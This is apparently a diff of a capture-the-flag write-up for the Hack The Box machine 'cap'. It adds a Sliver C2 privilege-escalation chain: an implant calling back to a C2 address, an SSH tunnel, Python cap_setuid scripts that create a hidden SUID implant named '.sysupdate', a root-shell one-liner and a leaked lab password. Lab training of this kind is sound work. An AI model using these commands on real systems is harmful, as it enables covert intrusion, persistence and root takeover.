@@ -151,33 +151,203 @@ ssh nathan@10.129.3.86 'chmod +x /tmp/htb_implant && /tmp/htb_implant &'
 Using Sliver's `execute` command for non-interactive enumeration:
 
 ```
+use <session-id>
 execute -o getcap /usr/bin/python3.8
 execute -o id
 ```
 
-### Capability-Based Privilege Escalation via Sliver
+**Output:**
+```
+/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)
+```
 
-Creating a Python script for privilege escalation:
+### Obtaining Root Shell via Sliver (OPSEC-Safe Method)
 
-```python
+#### Step 1: Create SUID Implant Script
+
+On the Sliver server, create a script to copy the implant with SUID bit:
+
+```bash
+cat > /tmp/mk_suid.py << 'EOF'
+import os
+import shutil
+
+os.setuid(0)
+shutil.copy("/tmp/htb_implant", "/tmp/.sysupdate")
+os.chmod("/tmp/.sysupdate", 0o4755)
+os.chown("/tmp/.sysupdate", 0, 0)
+print("SUID implant created")
+EOF
+```
+
+#### Step 2: Fix Implant Permissions
+
+The implant initially has execute-only permissions. Make it readable:
+
+```
+execute -o chmod 755 /tmp/htb_implant
+```
+
+#### Step 3: Upload and Execute SUID Creation Script
+
+```
+upload /tmp/mk_suid.py /tmp/mk_suid.py
+execute -o /usr/bin/python3.8 /tmp/mk_suid.py
+```
+
+Verify the SUID implant was created:
+
+```
+execute -o -- ls -la /tmp/.sysupdate
+```
+
+**Output:**
+```
+-rwsr-xr-x 1 root nathan 17207231 Mar 10 04:06 /tmp/.sysupdate
+```
+
+#### Step 4: Create Root Execution Wrapper
+
+SUID binaries don't automatically elevate the Sliver implant. Create a wrapper that uses Python's `cap_setuid` to become root before executing the implant:
+
+```bash
+cat > /tmp/root_exec.py << 'EOF'
+import os
+
+# Escalate to root using cap_setuid
+os.setuid(0)
+
+# Execute the implant with root privileges
+os.execve("/tmp/.sysupdate", ["/tmp/.sysupdate"], os.environ)
+EOF
+```
+
+#### Step 5: Execute Wrapper for Root Callback
+
+```
+upload -o /tmp/root_exec.py /tmp/root_exec.py
+execute /usr/bin/python3.8 /tmp/root_exec.py &
+```
+
+Wait a few seconds for the callback.
+
+#### Step 6: Verify Root Session
+
+```
+sessions
+```
+
+**Output:**
+```
+ID         Transport   Remote Address         Hostname   Username   Operating System   Health  
+========== =========== ====================== ========== ========== ================== =========
+50f252d6   mtls        127.0.0.1:37108        cap        nathan     linux/amd64        [ALIVE] 
+a1b2c3d4   mtls        127.0.0.1:59474        cap        root       linux/amd64        [ALIVE]
+```
+
+#### Step 7: Interact with Root Session
+
+```
+use <root-session-id>
+getuid
+whoami
+execute -o cat /root/root.txt
+```
+
+**Root Flag:** Obtained
+
+## Complete OPSEC-Safe Attack Chain
+
+### Summary of Commands
+
+**Initial Access:**
+```bash
+# Reconnaissance
+nmap -sV -sC -p- 10.129.3.86
+
+# IDOR Exploitation
+curl -s http://10.129.3.86/download/0 -o 0.pcap
+
+# Credential Extraction
+tcpdump -r 0.pcap -A 2>/dev/null | grep -i -A 5 -B 5 'USER\|PASS'
+
+# SSH Access
+ssh nathan@10.129.3.86
+# Password: Buck3tH4TF0RM3!
+cat user.txt
+```
+
+**Sliver C2 Setup:**
+```bash
+# On Sliver Server
+mtls -L 0.0.0.0 -l 4443
+generate --mtls 10.10.15.1:443 --os linux --arch amd64 --save /tmp/htb_implant --skip-symbols
+
+# On Kali (SSH tunnel for network routing)
+ssh -f -N -L 10.10.15.1:443:127.0.0.1:4443 debian@192.168.36.209
+
+# Transfer implant
+scp /tmp/htb_implant nathan@10.129.3.86:/tmp/htb_implant
+ssh nathan@10.129.3.86 'chmod +x /tmp/htb_implant && /tmp/htb_implant &'
+```
+
+**Privilege Escalation (Sliver):**
+```bash
+# In Sliver console
+use <session-id>
+execute -o getcap /usr/bin/python3.8
+execute -o chmod 755 /tmp/htb_implant
+
+# Create SUID script on Sliver server
+cat > /tmp/mk_suid.py << 'EOF'
+import os
+import shutil
+os.setuid(0)
+shutil.copy("/tmp/htb_implant", "/tmp/.sysupdate")
+os.chmod("/tmp/.sysupdate", 0o4755)
+os.chown("/tmp/.sysupdate", 0, 0)
+print("SUID implant created")
+EOF
+
+# Upload and execute
+upload /tmp/mk_suid.py /tmp/mk_suid.py
+execute -o /usr/bin/python3.8 /tmp/mk_suid.py
+execute -o -- ls -la /tmp/.sysupdate
+
+# Create root wrapper on Sliver server
+cat > /tmp/root_exec.py << 'EOF'
 import os
 os.setuid(0)
-print(open("/root/root.txt").read())
-```
+os.execve("/tmp/.sysupdate", ["/tmp/.sysupdate"], os.environ)
+EOF
 
-Upload and execute:
-```
-upload /tmp/privesc.py /tmp/privesc.py
-execute -o /usr/bin/python3.8 /tmp/privesc.py
+# Execute wrapper for root callback
+upload -o /tmp/root_exec.py /tmp/root_exec.py
+execute /usr/bin/python3.8 /tmp/root_exec.py &
+
+# Verify root access
+sessions
+use <root-session-id>
+getuid
+execute -o cat /root/root.txt
 ```
 
 ## Key Takeaways
 
 1. **IDOR vulnerabilities** can expose sensitive data - always test sequential IDs
-2. **Network traffic analysis** can reveal cleartext credentials
+2. **Network traffic analysis** can reveal cleartext credentials in PCAP files
 3. **Linux capabilities** provide an alternative to traditional SUID privilege escalation
-4. **OPSEC considerations** in post-exploitation: avoid interactive shells, use `execute` for single commands
+4. **OPSEC considerations** in post-exploitation:
+   - Avoid interactive shells (`shell` command)
+   - Use `execute` for single commands to minimize process artifacts
+   - SUID binaries don't auto-escalate - need wrapper scripts
+   - Use `upload` instead of external file transfers
 5. **Network pivoting** is essential when C2 infrastructure is not directly reachable from target
+6. **Python capabilities** (`cap_setuid`) can be leveraged multiple ways:
+   - Direct root shell: `python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'`
+   - Create SUID binaries: Use `os.setuid(0)` before file operations
+   - Wrap execution: Escalate before calling `os.execve()`
 
 ## Attack Path Summary
 
